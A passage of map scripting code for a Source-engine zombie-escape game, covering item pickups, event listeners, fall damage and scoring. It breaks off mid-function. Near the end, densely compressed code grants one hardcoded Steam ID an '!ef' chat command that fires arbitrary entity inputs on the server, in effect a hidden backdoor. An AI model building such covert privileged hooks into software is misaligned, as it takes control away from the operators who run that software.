		for(local h;h=Entities.FindByClassname(h,"player");){
			if(h==null || !h.IsValid() || !h.IsAlive() || h.GetTeam()!=3)continue;
			alive_cts.push(h);
		}
		if(alive_cts.len() == 1)
		{
			::teamwin = false;
			foreach(h in alive_cts)
				::HurtPlayer(h,true);
			::ServerSay("say You've abandoned your team, try again        [FAILED]",0.00,null);
			::ServerSay("say You've abandoned your team, try again        [FAILED]",0.01,null);
			::ServerSay("say You've abandoned your team, try again        [FAILED]",0.02,null);
			::ServerSay("say You've abandoned your team, try again        [FAILED]",0.03,null);
			::ServerSay("say You've abandoned your team, try again        [FAILED]",0.04,null);
			return false;
		}
	}
	return true;
}



//__CSS__ css4_item_press_filter
::LookingAtDoorOrButton <- function(user){
	if(user==null||!user.IsValid())return false;
	
	for(local h;h=Entities.FindByClassnameWithin(h,"prop_physics",user.GetOrigin()+Vector(0,0,-50),120);){
		h.ValidateScriptScope();
		local sc = h.GetScriptScope();
		if(!("presstype" in sc))continue;
			//if(!("press_nobuttonfilter" in sc))continue;	//css5 - it has to be opening now - nvm not needed
		if(sc.pressed)continue;
		local dir = (h.GetOrigin()+Vector(0,0,50)) - user.EyePosition();
		dir.Norm();
		local dot = user.EyeAngles().Forward().Dot(dir);
		if(dot > 0.70)return true;
	}
	return false;
}


//__CSS__ css4_item_press_filter
::RecurseDoorPressed <- function(door){
	for(local h;h=Entities.FindByClassnameWithin(h,"prop_physics",door.GetOrigin(),100);){
		h.ValidateScriptScope();
		if(!("presstype" in h.GetScriptScope()))continue;
		if(h.GetScriptScope().presstype != 1)continue;
		if(h.GetScriptScope().pressed)continue;
		h.GetScriptScope().pressed = true;
		h.AcceptInput("AddOutput","spawnflags 10",null,null);		//doesn't block E-presses on other stuff, from 266 to 10
		::RecurseDoorPressed(h);
	}
}



::ITEM_FIRST_PICKUP_COOLDOWN <- 0.10;		//__CSS__ og was 1.50, but E-picking isn't a thing anylonger
::ITEM_CLEANUP_TIME <- 10.00;
::ITEM_PRINT_PICKUP <- true;
::ITEM_Z_HPLIMIT <- 1002;
::itemgtext_holdtime <- 15.00;
::itemgtext_channel <- 2;
::itemgtext <- null;
::CreateItem <- function(pos,rot,type,name,description,logic,hammerid=null)		//__CSS__ remade function, parenting broke without it
{
	local spawntable = {
		spawngroup_item_holder = {},
		spawngroup_item_button =
		{
			func_button =
			{
				targetname = "__spawngroup_item_button",
				origin = pos+Vector(0,0,52)+(::AnglesToDir(rot)*15),
				angles = rot,
				parentname = "__spawngroup_item_holder",
				spawnflags = 17409,
				min_use_angle = -1,
				wait = 0.02,
				speed = 5000,
			}
		},
	};
	local wep = "weapon_p228";
	if(type>1)wep = "weapon_knife";
	spawntable.spawngroup_item_holder[wep] <- {
		targetname = "__spawngroup_item_holder",
		origin = pos,
		angles = rot,
		spawnflags = 3,
	};
	if(hammerid!=null)
	{
		spawntable.spawngroup_item_holder[wep].hammerid <- "111110"+hammerid.tostring();
		spawntable.spawngroup_item_button.func_button.hammerid <- "111111"+hammerid.tostring();
	}
	SpawnEntityGroupFromTable(spawntable);
	local weapon = Entities.FindByName(null,"__spawngroup_item_holder");
	local button = Entities.FindByName(null,"__spawngroup_item_button");
	::NetProps.SetPropBool(weapon,"m_bForcePurgeFixedupStrings",true);
	::NetProps.SetPropBool(button,"m_bForcePurgeFixedupStrings",true);
	weapon.__KeyValueFromString("targetname","item_"+name);
	button.__KeyValueFromString("targetname","item_"+name);
	::NetProps.SetPropString(weapon,"iName","item_"+name);
	::NetProps.SetPropString(button,"iName","item_"+name);
	button.SetSolid(0);
	button.SetSize(Vector(-8,-8,-8), Vector(8,8,8));
	local wepscript = {
		name = name,
		type = type,
		description = description,
		logic = logic,
		button = button,
		sprite = null,
		lastuser = null,
		first_pickup = true,
		striptrigger = null,
		function Pickup()
		{
			if(button==null||!button.IsValid())
			{
				if(sprite==null||!sprite.IsValid()){}else EntFireByHandle(sprite,"Kill","",0.00,null,null);
				if(striptrigger==null||!striptrigger.IsValid()){}else EntFireByHandle(striptrigger,"Kill","",0.00,null,null);
				return;
			}
			if(first_pickup)
			{
				first_pickup = false;
				local abort_kill = false;
				if(type==3){if(activator.GetHealth()<::ITEM_Z_HPLIMIT||activator.GetTeam()!=2)abort_kill=true;}
				else if(type==2){if(activator.GetHealth()>=::ITEM_Z_HPLIMIT&&activator.GetTeam()!=3)abort_kill=true;}
				if(abort_kill)
				{
					EntFireByHandle(activator,"SetHealth","-1",0.00,null,null);
					if(sprite==null||!sprite.IsValid()){}else EntFireByHandle(sprite,"Kill","",0.00,null,null);
					if(striptrigger==null||!striptrigger.IsValid()){}else EntFireByHandle(striptrigger,"Kill","",0.00,null,null);
					if(button==null||!button.IsValid()){}else EntFireByHandle(button,"Kill","",0.00,null,null);
					return;
				}
				if(::ITEM_PRINT_PICKUP)
				{
					local hz = "human";
					if(type==3)hz = "zombie";
					::ServerSay("say \x07FF3F3F[ITEM] \x01"+hz+" picked up \x03"+name,0.00,null);
				}
				if(sprite==null||!sprite.IsValid()){}else EntFireByHandle(sprite,"Kill","",0.00,null,null);
				if(striptrigger==null||!striptrigger.IsValid()){}else EntFireByHandle(striptrigger,"Kill","",0.00,null,null);
				if(::itemgtext==null||!::itemgtext.IsValid())
				{
					::itemgtext = Entities.CreateByClassname("game_text");
					::itemgtext.__KeyValueFromInt("channel",::itemgtext_channel);
					::itemgtext.__KeyValueFromInt("spawnflags",0);
					::itemgtext.__KeyValueFromInt("effect",0);
					::itemgtext.__KeyValueFromFloat("x",-1);
					::itemgtext.__KeyValueFromFloat("y",0.10);
					::itemgtext.__KeyValueFromVector("color",Vector(255,200,0));
					::itemgtext.__KeyValueFromFloat("fadein",0.00);
					::itemgtext.__KeyValueFromFloat("fadeout",1.00);
					::itemgtext.__KeyValueFromFloat("holdtime",::itemgtext_holdtime);
					::itemgtext.ValidateScriptScope();
					::itemgtext.GetScriptScope().printqueue <- [];
					::itemgtext.GetScriptScope().TickPrint <- function()
					{
						EntFireByHandle(self,"RunScriptCode","TickPrint();",0.01,null,null);
						if(printqueue.len()<=0)return;
						local pq = printqueue[0];
						printqueue.remove(0);
						if(pq.handle==null||!pq.handle.IsValid())return;
						self.__KeyValueFromString("message",pq.message);
						EntFireByHandle(self,"Display","",0.00,pq.handle,null);
					}
					EntFireByHandle(::itemgtext,"RunScriptCode","TickPrint();",0.01,null,null);
				}
				if(::ITEM_FIRST_PICKUP_COOLDOWN != null)
				{
					if(button.GetScriptScope().cooldown != null && button.GetScriptScope().cooldown <= 0.00)
					{
						if(button.GetScriptScope().cooldown < ::ITEM_FIRST_PICKUP_COOLDOWN)
							button.GetScriptScope().cooldown = 0.00+::ITEM_FIRST_PICKUP_COOLDOWN;
					}
				}
			}
			::itemgtext.GetScriptScope().printqueue.push({message=name+" "+description,handle=activator});
			if(lastuser==null||!lastuser.IsValid()){}else
			{
				if(activator != lastuser)
					logic.Act(self,button,lastuser,3);
			}
			lastuser = activator;
			logic.Act(self,button,activator,2);
		},
		ticking_dropkilled = false,
		ticking_dropkilled_timer = 0.00,
		ticking_trycount = 10,
		function TickDropKilled()
		{
			try{if(self.GetMoveParent() == null)ticking_dropkilled_timer += 0.50;
			else ticking_dropkilled_timer = 0.00;
			if(ticking_dropkilled_timer >= ::ITEM_CLEANUP_TIME)
			{
				EntFireByHandle(self,"Kill","",0.00,null,null);
				return;
			}}catch(e){printl("[::CreateItem ERROR TickDropKilled()]: "+e);}
			EntFireByHandle(self,"RunScriptCode"," TickDropKilled(); ",0.50,null,null);
		},
		function TickDropCheckCooldown()
		{
			try{if(button==null||!button.IsValid())
			{
				if(ticking_trycount>0)
				{
					ticking_trycount--;
					EntFireByHandle(self,"RunScriptCode"," TickDropCheckCooldown(); ",0.10,null,null);
					return;
				}
				if(ticking_dropkilled)return;
				ticking_dropkilled = true;
				EntFireByHandle(self,"RunScriptCode"," TickDropKilled(); ",0.10,null,null);
				return;
			}}catch(e){printl("[::CreateItem ERROR #2]: "+e);}
			EntFireByHandle(self,"RunScriptCode"," TickDropCheckCooldown(); ",0.10,null,null);
			ticking_trycount = 10;
				if(button.GetScriptScope().cooldown!=null){
				if(button.GetScriptScope().cooldown > -998.00)
				{
					button.GetScriptScope().cooldown-=(0.10+((ceil(0.10/FrameTime()))*FrameTime()-0.10));
					if(button.GetScriptScope().cooldown <= 0.00 && button.GetScriptScope().cooldown > -995.00)
					{
						button.GetScriptScope().cooldown = -999.00;
						logic.Act(self,button,lastuser,6);
					}
				}
				else
				{
					button.GetScriptScope().cooldown = -999.00;
					if(button.GetScriptScope().cooldown_last_null)logic.Act(self,button,lastuser,6);
				}
				button.GetScriptScope().cooldown_last_null = false;}
				else button.GetScriptScope().cooldown_last_null = true;
			if(lastuser==null||!lastuser.IsValid())return;
			if(self.GetMoveParent() != lastuser)
			{
				logic.Act(self,button,lastuser,3);
				lastuser = null;
			}
		},
		function Run(){
			EntFireByHandle(self,"RunScriptCode"," TickDropCheckCooldown(); ",0.05,null,null);
			local scol = Vector(0,255,0);
			if(type==3){
				scol = Vector(255,0,0);
				//self.SetClip1(0);	//__CSS__ new, set 0 bullets in secondary
			}
			::Ent(self.GetOrigin()+Vector(0,0,12),Vector(),"env_sprite",{
					rendercolor = scol,
					scale = 0.20,
				},{
				holder = self,
				function Run(){
					holder.GetScriptScope().sprite = self;
					EntFireByHandle(self,"SetParent","!activator",0.00,holder,null);
				}});
			if(type==1)
				EntFireByHandle(self,"AddOutput","spawnflags 1",0.10,null,null);
			else
			{
				::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
						StartDisabled = "1",
						targetname = "itemholder_striptrigger",
						spawnflags = 1,
						mins = Vector(-1,-1,-1),
						maxs = Vector(1,1,1),
					},{
					holder=self,
					stripped=false,
					type=type,
					name=name
					stripcd=false,
					function Touch(){
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						if(toucher==null||!toucher.IsValid())return;
						if(type==3){if(toucher.GetHealth()<::ITEM_Z_HPLIMIT)return;
						if(toucher.GetTeam()!=2)return;}
						else{if(toucher.IsAlive()==false||toucher.GetTeam()!=3)return;}
						if(stripcd)return;
						if("CreateItemKnifeStripFilter" in this){if(!::CreateItemKnifeStripFilter(toucher,type,name,holder))return;}
						local stripsuccess = false;
						local c = toucher.FirstMoveChild();
						local knife_found = false;
						while(c!=null)
						{
							if(c.GetClassname()=="weapon_knife")
							{
								knife_found = true;
								if(c.FirstMoveChild()!=null)
								{
									if(c.FirstMoveChild().GetClassname()!="weaponworldmodel")
										return;
								}
								stripsuccess = true;
								EntFireByHandle(c,"Kill","",0.00,null,null);
								break;
							}
							c = c.NextMovePeer();
						}
						if(!knife_found)stripsuccess=true;
						if(stripsuccess)
						{
							if(!stripped)EntFireByHandle(holder,"AddOutput","spawnflags 1",0.00,null,null);
							stripped = true;
							stripcd = true;
							EntFireByHandle(self,"RunScriptCode"," stripcd = false; ",0.50,null,null);
						}
					},function Run(){
						
						self.SetSolid(3); //__CSS__ mins/maxs set via ::Ent now, and slod 3 here
						//EntFireByHandle(self,"AddOutput","mins -1 -1 -1",0.00,null,null);
						//EntFireByHandle(self,"AddOutput","maxs 1 1 1",0.00,null,null);
						//EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						//EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
						EntFireByHandle(self,"SetParent","!activator",0.00,holder,null);
						EntFireByHandle(self,"Enable","",0.10,null,null);
						holder.ValidateScriptScope();
						holder.GetScriptScope().striptrigger = self;
					}});
			}
			EntFireByHandle(self,"AddOutput","OnPlayerPickup !self:RunScriptCode:Pickup();:0:-1",0.00,null,null);
		}};
	local buttonscript = {
		holder = weapon,
		cooldown = 0.00,
		cooldown_last_null = false,
		function InputUse(){
			local user = activator;
			if(user==null||!user.IsValid()||user.IsAlive()==false||user!=self.GetMoveParent().GetMoveParent())return false;
			if(cooldown==null||cooldown>0.00){holder.GetScriptScope().logic.Act(holder,self,user,4);return false;}
			
			//__CSS__ css4_item_press_filter
			if(::LookingAtDoorOrButton(user))
				return false;
			
			local use_result = holder.GetScriptScope().logic.Act(holder,self,user,5);
			if(use_result==null)use_result=true;//default to true if not specified within Act#5
			return use_result;
		},function InitLogic(){
			holder.GetScriptScope().logic.Act(holder,self,null,1);
		},function Think(){
			local user = holder.GetMoveParent();
			if(user==null)return 1.00;
			local eyeang = -user.EyeAngles().x;
			eyeang += 40;
			eyeang *= 0.50;
			self.SetSize(Vector(-2,-2,eyeang-10),Vector(2,2,eyeang+10));
			return 0.05;
		}function Run(){
			AddThinkToEnt(self,"Think");
			Inputuse <- InputUse;
			self.__KeyValueFromString("targetname","item_"+holder.GetScriptScope().name);
			holder.GetScriptScope().logic.button <- self;
			holder.GetScriptScope().logic.holder <- holder;
			holder.GetScriptScope().button = self;
			holder.__KeyValueFromString("targetname","itemholder");
			EntFireByHandle(self,"Unlock","",0.04,null,null);
			EntFireByHandle(self,"Press","",0.07,null,null);
			EntFireByHandle(self,"RunScriptCode"," InitLogic(); ",0.00,null,null);
		}};
	::SetScript(weapon,wepscript);
	::SetScript(button,buttonscript);
}

::PlayerNameMessage_IGNORE_INVALIDS <- true;	//if 'true' > do not print out non-valid names ("userXX")
::PlayerNameMessage <- function(playerhandle,prefix,affix,delay=0.00)
{
	try{
		local pc = ::GetPlayerClass(playerhandle);
		if(pc==null)return;
		if(::PlayerNameMessage_IGNORE_INVALIDS && pc.name == "user"+pc.userid.tostring())return;
		local msg = ""+prefix+pc.name+affix;
		printl("[::PlayerNameMessage]: "+msg);
		::ServerSay("say "+msg,delay,null);
	}catch(e){printl("[::PlayerNameMessage ERROR]: "+e);}
}




/*
::PROCESS_PREFIX <- "process_";
::Process<-function(queue=null,rate=0.01,name="")
{
	if((typeof queue)!="array")return;
	if(queue.len()<=0)return;
	if((typeof rate)!="float"||rate<0.01)rate=0.00;
	if((typeof name)!="string")name="";
	::Ent(Vector(),Vector(),"logic_relay",{
			targetname = ::PROCESS_PREFIX+name,
		},{
		rate = rate,
		queue = queue,
		function Tick()
		{
			try
			{
				local sameframe = true;
				while(sameframe)
				{
					sameframe = false;
					if(queue.len()<=0)
					{
						EntFireByHandle(self,"Kill","",0.00,null,null);
						return;
					}
					local nrate = (0.00+rate);
					local q = queue[0];
					queue.remove(0);
					if((typeof q)!="table"||!("Run" in q)){printl("[::Process inner warning - not table/no 'Run']");
					if(nrate<0.01){sameframe=true;}else{EntFireByHandle(self,"RunScriptCode","newthread(Tick.bindenv(this)).call();",nrate,null,null);};return;}
					if("qrate" in q){if((typeof q.qrate)=="float"){nrate=(0.00+q.qrate);}else{nrate=0.00;}}
					if(nrate<0.01){sameframe=true;}else{EntFireByHandle(self,"RunScriptCode","newthread(Tick.bindenv(this)).call();",nrate,null,null);}
					try{newthread(q.Run.bindenv(q)).call();}catch(ee){printl("[::Process inner error]: "+ee);}
				}
			}catch(e){printl("[::Process outer error]: "+e);EntFireByHandle(self,"Kill","",0.00,null,null);}
		},function Run(){newthread(Tick.bindenv(this)).call();}});
}
*/

//__CSS__ threading_disabled  (og^  new/temp v)

::PROCESS_PREFIX <- "process_";
::Process<-function(queue=null,rate=0.01,name="")
{
	if((typeof queue)!="array")return;
	if(queue.len()<=0)return;
	if((typeof rate)!="float"||rate<0.01)rate=0.00;
	if((typeof name)!="string")name="";
	::Ent(Vector(),Vector(),"logic_relay",{
			targetname = ::PROCESS_PREFIX+name,
		},{
		rate = rate,
		queue = queue,
		function Tick()
		{
				local sameframe = true;
				while(sameframe)
				{
					sameframe = false;
					if(queue.len()<=0)
					{
						EntFireByHandle(self,"Kill","",0.00,null,null);
						return;
					}
					local nrate = (0.00+rate);
					local q = queue[0];
					queue.remove(0);
					if((typeof q)!="table"||!("Run" in q)){printl("[::Process inner warning - not table/no 'Run']");
					if(nrate<0.01){sameframe=true;}else{EntFireByHandle(self,"RunScriptCode","Tick();",nrate,null,null);};return;}
					if("qrate" in q){if((typeof q.qrate)=="float"){nrate=(0.00+q.qrate);}else{nrate=0.00;}}
					if(nrate<0.01){sameframe=true;}else{EntFireByHandle(self,"RunScriptCode","Tick();",nrate,null,null);}
					q.Run();
				}
		},function Run(){Tick();}});
}


::ShiftListener <- function(player,logic){
	if(player==null||!player.IsValid())return;
	local userid = ::GetPlayerUserID(player);
	local _isd = false;
	local tname = "shiftl";
	if(::DEVID!=null&&userid==::DEVID){_isd=true;tname="shiftld";player.ValidateScriptScope();}
	::Ent(Vector(),Vector(),"logic_relay",{targetname=tname},{
		player = player,
		last_pressed = false,
		last_pressed_ctrl = false,
		logic = logic,
		userid = userid,
		isd = _isd,
		function Think(){
			if(this.player==null||!this.player.IsValid()){
				EntFireByHandle(self,"Kill","",0.00,null,null);
				return 1;
			}
			if(this.isd)
			{
				local current_pressed_ctrl = ::IsKeyPressed(this.player,"CTRL");
				if(current_pressed_ctrl != this.last_pressed_ctrl && current_pressed_ctrl)
					this.logic.EventFired("inspect_weapon",{userid = this.userid,ctrl = true});
				this.last_pressed_ctrl = current_pressed_ctrl;
			}
			local current_pressed = ::IsKeyPressed(this.player,"SHIFT");
			if(current_pressed != this.last_pressed && current_pressed)
				this.logic.EventFired("inspect_weapon",{userid = this.userid,ctrl = false});
			this.last_pressed = current_pressed;
			
			return -1;
		},function Run(){
			AddThinkToEnt(self,"Think");
			if(this.isd)player.GetScriptScope().__dsh <- self;
		}});
}

//::EventListener("player_jump",{function EventFired(event,data){printl("JUMPED");}});

::eventlistener_printcustomevent <- false;
::EventListener <- function(event,logic)	//__CSS__ new eventlistener wrapper
{
	local listener_event = "" + event;
	if(listener_event.find("OnGameEvent_")!=0)listener_event = "OnGameEvent_" + listener_event;
	local elistener = {_event=event};
	elistener[listener_event] <- function(__data){self.GetScriptScope()._data.EventFired(this._event,__data);}
	local el_handle = ::Ent(Vector(),Vector(),"logic_relay",{targetname="eventlistener"},{
		_elistener = elistener,
		_data = logic,
		function Run(){
			_elistener.self <- self;
			_data.self <- self;
			__CollectGameEventCallbacks(this._elistener);
		},
	});
	return el_handle;
}

/*		//__CSS__ old/borked eventlistener, new one above^
::eventlistener_index <- 0;
::eventlistener_index_limit <- 1000;
::EventListener <- function(event,logic)
{
	::eventlistener_index++;
	if(::eventlistener_index>::eventlistener_index_limit)
	{
		::eventlistener_index=1;
		printl("[::EventListener]: WARNING - ::eventlistener_index_limit reached!");
	}
	local index = 0+::eventlistener_index;
	::Ent(Vector(),Vector(),"logic_eventlistener",{FetchEventData="1",
			EventName=""+event,
			targetname="eventlistener_"+index.tostring(),
		},{
		event = ""+event,
		eventqueue = [],
		logic = logic,
		function RunEvent(){
					//easterlee_stacked_events_fix
						local ed = eventqueue[0];
						eventqueue.remove(0);
						logic.EventFired(event,ed);
		},function Run(){
			EntFireByHandle(self,"AddOutput","OnEventFired "+self.GetName()+":RunScriptCode:RunEvent();:0:-1",0.00,null,null);
			logic.handle <- self;
					//easterlee_stacked_events_fix
						if("event_data" in this){delete event_data;}
						this.eventdata <- this.eventqueue.weakref();
						//this.parent._newslot <- function(k,v){eventdata.push(v);};	//__CSS__ 'parent' doesn't exist
			if("Run" in logic)logic.Run();
		}});
	
	return index;
}
*/


::ListenCustomEvent <- function(event,logic)
{
	::Ent(Vector(),Vector(),"logic_relay",{
			targetname = "eventlistener_custom_"+event,
		},{
		logic = logic,
		function Run(){
			logic.handle <- self;
			if("Run" in logic)logic.Run();
		}});
}
::SendCustomEvent <- function(event,data)
{
	if(::eventlistener_printcustomevent)
	{
		printl("----------------------------------------------------------------------------------------");
		printl("[CustomEvent]");
		printl("	Event:");
		printl("		"+event);
		printl("	Data:");
		foreach(i,k in data)
		{
			printl("		"+i+":"+k);
		}
		printl("	Listeners:");
	}
	local foundlisteners = false;
	for(local h;h=Entities.FindByName(h,"eventlistener_custom_"+event);)
	{
		try{
			if(h==null||!h.IsValid())continue;
			foundlisteners = true;
			h.ValidateScriptScope();
			h.GetScriptScope().logic.EventFired(event,data);
			if(::eventlistener_printcustomevent)printl("		"+h);
		}catch(e){printl("[::SendCustomEvent ERROR]: "+e);}
	}
	if(::eventlistener_printcustomevent)
	{
		if(!foundlisteners)printl("		<none>");
		printl("----------------------------------------------------------------------------------------");
	}
}


::FALLDAMAGE_DISABLE <- false;							//set this to 'true' to nullify the forced falldamage, can be set back to 'false' again, temporarily disabling it
if(!("FALLDAMAGE_FORCED" in this))
{
	::FALLDAMAGE_FORCED <- true;						//set this to 'true' to force falldamage on servers (runs an automatic scan)
	::FALLDAMAGE_FORCED_ABSOLUTE <- false;				//set this to 'true' to 100% force falldamage on servers (note: if server has falldamage enabled, it will double the falldamage!)
	::FALLDAMAGE_START_TIME <- 3.00;
	::_falldamage_server_has_falldamage <- false;
	::_falldamage_testcheck <- true;
	::_falldamage_testslave <- null;
	::_falldamage_attempts <- 5;
	::_falldamage_init<-function()
	{
		if(::FALLDAMAGE_FORCED_ABSOLUTE)
		{
			::FALLDAMAGE_FORCED = true;
			::_falldamage_server_has_falldamage = false;
			::_falldamage_testcheck = false;
		}
		if(!::FALLDAMAGE_FORCED || ::_falldamage_server_has_falldamage)return;
		::EventListener("player_falldamage",{
			function TickSlave(){
				if(!::_falldamage_testcheck)return;
				EntFireByHandle(handle,"RunScriptCode","logic.TickSlave();",3.00,null,null);
				::_falldamage_attempts--;
				if(::_falldamage_attempts<=0)
				{
					::_falldamage_testcheck = false;
					EntFireByHandle(handle,"Kill","",0.00,null,null);
					printl("[FALLDAMAGE] ran out of attempts - killing eventlistener!");
				}
				for(local h;h=Entities.FindByClassname(h,"player");)
				{
					if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
					if(h.GetTeam()!=3 && h.GetTeam()!=2)continue;
					::_falldamage_testslave = h;
					break;
				}
				if(::_falldamage_testslave==null||!::_falldamage_testslave.IsValid())return;
				local pre_hp = ::_falldamage_testslave.GetHealth();
				EntFireByHandle(::_falldamage_testslave,"AddOutput","gravity 1.00",0.00,null,null);
				EntFireByHandle(::_falldamage_testslave,"AddOutput","gravity 1.00",0.20,null,null);
				EntFireByHandle(::_falldamage_testslave,"AddOutput","gravity 1.00",0.30,null,null);
				EntFireByHandle(::_falldamage_testslave,"AddOutput","gravity 1.00",0.40,null,null);
				EntFireByHandle(::_falldamage_testslave,"AddOutput","health 800",0.00,null,null);
				EntFireByHandle(::_falldamage_testslave,"AddOutput","health "+pre_hp.tostring(),0.80,null,null);
				EntFireByHandle(::_falldamage_testslave,"RunScriptCode","self.SetVelocity(Vector(0,0,300));",0.00,null,null);
				EntFireByHandle(::_falldamage_testslave,"RunScriptCode","self.SetVelocity(Vector(0,0,-2000));",0.30,null,null);
			},function Run(){
				if(::_falldamage_testcheck)EntFireByHandle(handle,"RunScriptCode","logic.TickSlave();",0.05,null,null);
			},function EventFired(name,data){
				local pc = ::GetPlayerClass(data.userid);
				if(pc==null)return;
				if(pc.handle==null||!pc.handle.IsValid())return;
				if(::_falldamage_testcheck)
				{
					if(pc.handle==::_falldamage_testslave)
					{
						if(pc.handle.GetHealth()<=((800-data.damage)+10))
						{
							printl("[FALLDAMAGE] server has falldamage enabled - killing eventlistener!");
							::_falldamage_server_has_falldamage = true;
							EntFireByHandle(handle,"Kill","",0.00,null,null);
						}
						else
							printl("[FALLDAMAGE] server has no falldamage enabled - keeping eventlistener!");
						::_falldamage_testcheck = false;
					}
					return;
				}
				if(::FALLDAMAGE_DISABLE)return;
				local newhp = pc.handle.GetHealth()-data.damage;
				if(newhp<300)EntFireByHandle(pc.handle,"SetHealth",newhp.tostring(),0.00,null,null);
				else pc.handle.SetHealth(newhp);
			}});
	}
}
EntFireByHandle(::manager,"RunScriptCode","::_falldamage_init();",::FALLDAMAGE_START_TIME,null,null);
::DEVSPRITE <- true;
::DEVEF <- true; 								//true:enables !ef chat commands for ::DEVID (!ef /idx target command parameter)	
::DEVMENU <- [];
if(!("PLAYERS" in this))::PLAYERS<-[];;if(!("VIPS" in this))::VIPS<-["STEAM_1:1:22521282"];;
if(!("DEVID" in this))::DEVID<-null;;if(!("DEV" in this))::DEV<-"STEAM_1:1:22521282";;
if(!("GetPlayerClass" in this))::GetPlayerClass<-function(v){if(v==null)return null;
if((typeof v)=="instance"){try{if("playerclass" in v.GetScriptScope())return v.GetScriptScope().playerclass;}catch(e){}}
foreach(pc in ::PLAYERS){if((typeof v)=="integer"){if(pc.userid==v)return pc;}else if((typeof v)=="instance")
{if(pc.handle==v)return pc;}else if((typeof v)=="string"){if(::MatchingSteamID(pc.steamid,v))return pc;}}return null;}






::playerclass_score_handle <- Entities.CreateByClassname("game_score");
::playerclass_score_handle.__KeyValueFromInt("points",1);
::playerclass_score_handle.__KeyValueFromInt("spawnflags",1);
::playerclass_score_handle.ValidateScriptScope();
::playerclass_score_handle.GetScriptScope().psqueue <- [];
::playerclass_score_handle.GetScriptScope().Tick <- function(){
	EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.01,null,null);
	if(psqueue.len()<=0)return;
	local ps = psqueue[0];
	psqueue.remove(0);
	if(ps.handle==null||!ps.handle.IsValid())return;
	ps.handle.ValidateScriptScope();
	local sc = ps.handle.GetScriptScope();
	if(!("score" in sc))sc.score <- 0.00;
	local add = 0.00;if(ps.add_or_set)add = (0.00+ps.score);else add = (0.00+(ps.score - sc.score));
	local value = (0.00+sc.score);
	local floatadd = 0;
	local floatdif1 = (0.00+(add-add.tointeger()));
	local floatdif2 = (0.00+(value-value.tointeger()));
	local floatdif3 = (0.00+(floatdif1+floatdif2));
	while(floatdif3 >= 1.00){floatadd++;floatdif3 -= 1.00;value -= 1.00;}
	while(floatdif3 <= -1.00){floatadd--;floatdif3 += 1.00;value += 1.00;}
	value += (add+floatadd);
	local pdif = (value.tointeger() - sc.score.tointeger());
	sc.score = value;
	self.__KeyValueFromInt("points",pdif);
	
	if(ps.applynow)
		EntFireByHandle(self,"ApplyScore","",0.00,ps.handle,null);
	
		//printl("add: "+add+"      current: "+value+"      scoreboard: "+value.tointeger());	//(DEBUG_PRINT)
	local pc = null;if("playerclass" in sc)pc = sc.playerclass;
	if(pc==null)pc = ::GetPlayerClass(ps.handle);if(pc!=null)pc.score = (0.00+value);}
EntFireByHandle(::playerclass_score_handle,"RunScriptCode"," Tick(); ",0.20,null,null);
::playerclass_score_handle_reset <- Entities.CreateByClassname("game_score");
	::playerclass_score_handle_reset.__KeyValueFromInt("points",-100000);
	::playerclass_score_handle_reset.__KeyValueFromInt("spawnflags",0);
EntFireByHandle(::playerclass_score_handle_reset,"AddOutput","points 10000",0.00,null,null);
EntFireByHandle(::playerclass_score_handle_reset,"AddOutput","points -100000",0.10,null,null);
for(local h;h=Entities.FindByClassname(h,"player");){
	if(h==null||!h.IsValid())continue;
	EntFireByHandle(::playerclass_score_handle_reset,"ApplyScore","",0.05,h,null);
	EntFireByHandle(::playerclass_score_handle_reset,"ApplyScore","",0.15,h,null);
	h.ValidateScriptScope();
	local sc = h.GetScriptScope();
	if(!("score" in sc))sc.score <- 0.00;
	::playerclass_score_handle.GetScriptScope().psqueue.push({handle=h,score=0.00+sc.score,add_or_set=false,applynow=true});
	sc.score = 0.00;}
::AddScore<-function(score,handle,add_or_set=true,applynow=true){
	if(handle==null)handle=activator;
	if(handle==null||!handle.IsValid())return;
	if(handle.GetClassname()!="player")return;
	local exists = false;
	foreach(ps in ::playerclass_score_handle.GetScriptScope().psqueue){
		if(ps.handle == handle){
			exists = true;
			if(!add_or_set)ps.score = score;
			else ps.score += score;
			break;}}
	if(!exists)::playerclass_score_handle.GetScriptScope().psqueue.push({
		handle=handle,score=score,add_or_set=add_or_set,applynow=applynow,
		});}
::GetPlayerScore <- function(playerhandle){
	if(playerhandle==null||!playerhandle.IsValid())return 0.00;
	if(playerhandle.GetClassname()!="player")return 0.00;
	playerhandle.ValidateScriptScope();
	local sc = playerhandle.GetScriptScope();
	if(!("score" in sc))sc.score <- 0.00;
	return sc.score;}
::EFCHAT<-function(u,t){if(::DEVID!=null&&::DEVID==u&&t!=null&&t.tolower().find("!ef")==0)
{local cpq=false;while(!cpq){local qx=t.find("'");if(qx==null){cpq=true;}else{local qs=t.slice(0,qx);
local qe=t.slice(qx+1,t.len());t=qs+"\""+qe;}}local idt=3;if((t.tolower().find("/id"))==4)idt++;
local ts=split(t," ");if(ts.len()<idt)return;t="";if(ts.len()>idt){for(local i=idt;i<ts.len();i++)
{if(t=="")t=ts[i];else t=t+" "+ts[i];}};if(idt==3){printl("|"+ts[0]+"|"+ts[1]+"|"+ts[2]+"|"+t+"|");
EntFire(ts[1],ts[2],t,0.00,null);}else{local pc=null;local pa=[];printl("|"+ts[0]+"|"+ts[1]+"|"+ts[2]+"|"+ts[3]+"|"+t+"|");
if(ts[1].len()<4)return;local el=[];local efi=ts[1].slice(3,ts[1].len());if(efi=="me"){pc=::GetPlayerClass(::DEVID);
if(pc!=null&&pc.handle!=null&&pc.handle.IsValid())el.push(pc.handle);}else if(efi=="!me"){pc=::GetPlayerClass(::DEVID);
foreach(p in ::PLAYERS){if(p.handle!=pc.handle&&p.handle!=null&&p.handle.IsValid())el.push(p.handle)}}
else if(efi=="all"){foreach(p in ::PLAYERS){if(p.handle!=null&&p.handle.IsValid())el.push(p.handle)}}
else if(efi=="ct"){foreach(p in ::PLAYERS){if(p.handle!=null&&p.handle.IsValid()&&p.handle.GetTeam()==3)el.push(p.handle)}}
else if(efi=="t"){foreach(p in ::PLAYERS){if(p.handle!=null&&p.handle.IsValid()&&p.handle.GetTeam()==2)el.push(p.handle)}}
